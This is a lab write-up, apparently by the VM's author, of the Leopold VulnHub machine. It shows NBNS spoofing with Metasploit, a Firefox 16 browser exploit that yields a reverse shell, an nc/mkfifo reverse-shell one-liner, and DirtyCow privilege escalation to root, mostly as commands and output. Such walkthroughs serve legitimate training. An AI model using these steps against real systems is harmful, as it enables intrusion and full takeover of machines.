---
layout: post
title: Walkthrough of Leopold
published: true
categories: [vm]
tags: [vulnhub,sp,leopold]
fullview: false
description: A walkthrough of the leopold VM on VulnHub
comments: true
---

# Intro

Leopold was the second machine I created for my <a href="https://www.vulnhub.com/series/sp,189/">SP series</a> in late 2018, and I think it's the most popular of my machines. There are many walkthroughs out there for Leopold, but I wanted to show how I intended to solve it, but I have also made the walkthrough from an objective standpoint. Leopold is very different from any other VM that I have seen on VulnHub due to it's client-side aspect and will teach a real-world attack vector commonly used in penetration tests. Lastly, I would personally view this VM as easy in difficulty, but I have seen people complain about this. However, I think this is due to the unfamiliarity with this kind of exploitation.

## Enumeration

After finding the server on the network, we do a port scan to determine the services running:

```
$ nmap -sTV 192.168.0.31 -n -p-
---
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
---
```

The smb service doesn't yield anything useful, other than that it's a Linux machine, due to the Samba implementation of SMB. Where do we go from here? Let's fire up Wireshark to see if we can learn anything from there.

After some minutes we can see that there is a NBNS request for DISNEYWORLD made from leopold:
```
192.168.0.31 192.168.0.255 NBNS 92 Name query NB DISNEYWORLD<00>
```

## Setting up Man-in-the-middle

Netbios Name Service (NBNS) is like DNS, but simpler and decentralized. Instead of asking a server for hostname resolution, it sends out a broadcast asking the whole network if they know which IP-address a hostname resolves to. It is usually used together with LLMNR and mDNS as backup if a DNS request would fail. These protocols trusts the answers blindly, which makes them optimal for poisoning attacks to reroute the communication through our attacking machine.

There are multiple tools we can use for this, but we will stick to a Metasploit module which was made exactly for this.

Open Metasploit and use the auxiliary/spoof/nbns/nbns_response module. Set REGXP to "disneyworld" and SPOOFIP to your own attacking IP address. Keep Wireshark before writing "run" and hitting enter to start the module.

```
msf5 auxiliary(spoof/nbns/nbns_response) > options 

Module options (auxiliary/spoof/nbns/nbns_response):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   REGEX      disneyworld      yes       Regex applied to the NB Name to determine if spoofed reply is sent
   SPOOFIP    192.168.0.32     yes       IP address with which to poison responses
   TIMEOUT    500              yes       The number of seconds to wait for new data


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Run NBNS spoofing service


msf5 auxiliary(spoof/nbns/nbns_response) > run
[*] Auxiliary module running as background job 0.

[*] NBNS Spoofer started. Listening for NBNS requests with REGEX "disneyworld" ...
msf5 auxiliary(spoof/nbns/nbns_response) > 
```

Soon we will see the following output in Metasploit, meaning that leopold now thinks that the DISNEYWORLD hostname is resolving to our attacking computer.
```
[+] 192.168.0.31     nbns - DISNEYWORLD matches regex, responding with 192.168.0.32
```

We will also soon after see some TCP requests to port 80 from leopold to our attacking machine in Wireshark. However, we don't have anything running on port 80. We can fire up a netcat listener to see the request.

```
root@kali:~# nc -nlvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.0.31.
Ncat: Connection from 192.168.0.31:51910.
GET / HTTP/1.1
Host: disneyworld
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

Here we have the request leopold is making. There is two key pieces of information we can gather from this, namely the user-agent string and the endpoint he is trying to reach, which is the root directory. After a quick web search on the user-agent string, we learn that leopold is using Firefox 16.

## Initial Access

Searching for "firefox" in searchsploit gives many possible alternatives and after some research, the "toString console.time Privileged JavaScript Injection" exploit seems to be a match for the Firefox version in question and there is even a Metasploit module for it. The module sets up a webserver on the attacking machine to serve the browser exploit to visitors. Let's change the SRVPORT to 80, which was the port leopold was trying to reach, and URIPATH to "/", before running it.

```
msf5 exploit(multi/browser/firefox_tostring_console_injection) > options 

Module options (exploit/multi/browser/firefox_tostring_console_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CONTENT                   no        Content to display inside the HTML <body>.
   Retries  true             no        Allow the browser to retry the module
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  80               yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.32     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal (Javascript XPCOM Shell)


msf5 exploit(multi/browser/firefox_tostring_console_injection) > 
```

After some minutes we get a shell:

```
[*] 192.168.0.31     firefox_tostring_console_injection - Sending HTML response to 192.168.0.31
[-] 192.168.0.31     firefox_tostring_console_injection - Target 192.168.0.31 has requested an unknown path: /favicon.ico
[-] 192.168.0.31     firefox_tostring_console_injection - Target 192.168.0.31 has requested an unknown path: /favicon.ico
[*] Command shell session 1 opened (192.168.0.32:4444 -> 192.168.0.31:36555) at 2020-09-15 17:15:05 -0400
msf5 exploit(multi/browser/firefox_tostring_console_injection) > sessions -i 1
[*] Starting interaction with 1...

id
uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)

```

The shell is not stable and dies after some mintues. To fix this, we can create a new shell. Open a new netcat listener on port 3333 on the attacking machine and write the code below in the current shell. Remember to change the attacking IP address.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.32 3333 >/tmp/f
```


## Priv Esc

Due to the old Linux kernel version, we can try the goto DirtyCow exploit. Simply download, rename and host the source code on the attacking machine:

```
root@kali:~# wget https://www.exploit-db.com/download/40839
root@kali:~# mv 40839 40839.c
root@kali:~# python3 -m http.server 8080
```

Download, compile and run the exploit on the target host, from the remote leopold shell:

```$ wget http://192.168.0.32
$ gcc 40839.c -o cow -pthread -lcrypt
$ ./cow
```

Enter a password for the firefart root user and wait for the exploit to finish, before switching to the firefart user:

```
$ su firefart
$ id
$ uid=0(firefart) gid=0(root) groups=0(root)
```

## Summary

Leopold is a workstation and a user trying to browse the Internet. What is most likely a typo in the address bar of the web browser, results in DNS failing and the computer resorts to alternative name resolution systems, which are open for man-in-the-middle attacks. From here we poisoned the name resolution request and redirected Leopold's traffic to our attacking computer which served a browser exploit, gaining us remote access to Leopold's computer. Using a well known kernel exploit, we managed to gain administrative rights to his computer.  
  
This attack vector is being actively used in real world penetration tests, with tools such as Responder, that works with a lot of different protocols and sets up various fake services, such as SMB to steal domain credentials and hashes.
